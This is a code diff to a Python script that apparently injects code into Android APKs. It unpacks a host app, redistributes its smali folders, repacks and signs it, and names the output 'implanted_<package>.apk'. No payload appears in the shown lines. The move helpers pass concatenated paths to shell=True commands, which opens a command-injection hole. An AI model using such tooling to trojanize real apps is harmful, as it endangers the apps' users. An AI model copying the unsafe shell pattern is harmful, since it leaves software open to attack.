@@ -15,12 +15,31 @@ def unpack(host_dest):
     return False
   return True
 
-def find_smalis(host_dest):
+def decon_smalis(host_dest):
   smali_dirs = []
   dirs = os.listdir(host_dest+'host/')
   for d in dirs:
     if (d.find('smali') > -1):
       smali_dirs.append(host_dest+'host/'+d+'/')
+  dnum = len(smali_dirs)
+  for i in range(dnum):
+    dnum += 1
+    newdir = host_dest+'host/smali_classes'+str(dnum)+'/'
+    os.mkdir(newdir)
+    smali_dirs.append(newdir)
+    files = os.listdir(smali_dirs[i])
+    dirs = []
+    for f in files:
+      if (os.path.isdir(smali_dirs[i]+f)):
+        dirs.append(f)
+    for j in range(int(len(dirs)/2)):
+      move_dir(smali_dirs[i]+dirs[j], newdir)
+  return smali_dirs
+
+def move_dir(target, dest):
+  subprocess.check_call('mv '+target+' '+dest, shell=True)
+
+def find_smalis(host_dest, smali_dirs):
   # Find smalis
   smalis = []
   for sdir in smali_dirs:
@@ -32,7 +51,8 @@ def find_smalis(host_dest):
     find_smalis_from_dir(sdir, smalis, sdir_ex)
   if (smalis == []):
     return False
-  return smalis
+  new_dex_dir = host_dest+'host/smali_classes'+str(len(smali_dirs)+1)
+  return smalis, new_dex_dir
 
 def find_smalis_from_dir(smali_dir, smalis, sdir_ex):
   paths = os.listdir(smali_dir)
@@ -65,7 +85,7 @@ def find_activities(hd):
       activities.append('L'+activity.replace('.', '/')+';')
   return pkg, activities
 
-def detach(host_dest, keystore):
+def detach(host_dest, keystore, pkg):
   # Pack
   #print('  [--Z--] Packing')
   ret = pack(host_dest)
@@ -82,7 +102,7 @@ def detach(host_dest, keystore):
 
   # Move
   #print('  [--Z--] Moving')
-  ret = move(host_dest)
+  ret = move(host_dest, pkg)
   if (not ret):
     print('[--!--] Failed to move')
     return False
@@ -103,9 +123,9 @@ def sign(host_dest, keystore):
     return False
   return True
 
-def move(host_dest):
+def move(host_dest, pkg):
   try:
-    subprocess.check_call('mv '+host_dest+'host/dist/host.apk '+host_dest+'implanted.apk', shell=True)
+    subprocess.check_call('mv '+host_dest+'host/dist/host.apk '+host_dest+'implanted_'+pkg+'.apk', shell=True)
   except:
     return False
   return True
